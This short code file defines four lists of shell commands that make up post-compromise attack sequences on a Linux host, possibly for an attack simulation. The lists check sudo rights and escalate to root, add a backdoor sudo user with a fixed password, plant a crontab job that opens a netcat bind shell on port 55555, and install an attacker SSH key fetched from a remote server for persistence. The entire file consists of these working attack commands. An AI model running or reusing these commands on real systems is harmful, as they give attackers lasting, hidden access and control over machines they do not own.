SEQUENCE_0 = ["whoami",
              "pwd",
              "sudo -l",
              "sudo -i",
              "whoami"]

SEQUENCE_1 = ["whoami",
              "sudo -l",
              "sudo useradd pwnguin",
              "echo pwnguin:pwnguin | chpasswd",
              "sudo usermod -aG sudo pwnguin",
              "sudo su pwnguin",
              "touch pwnguined"]

SEQUENCE_2 = ["whoami",
              "cat /etc/crontab",
              "sudo echo '10 14 * * *   vagrant     nc -l -p 55555 -e /bin/bash' >> /etc/crontab",
              "cat /etc/crontab"]

SEQUENCE_3 = ["whoami",
              "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
              "mkdir ~/.ssh",
              "touch ~/.ssh/authorized_keys",
              "chmod 700 ~/.ssh",
              "cat id_rsa.pub > ~/.ssh/authorized_keys",
              "chmod 600 ~/.ssh/authorized_keys",
              "rm id_rsa.pub",
              "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
              "/etc/init.d/ssh restart",
              "echo get persisted kid"]
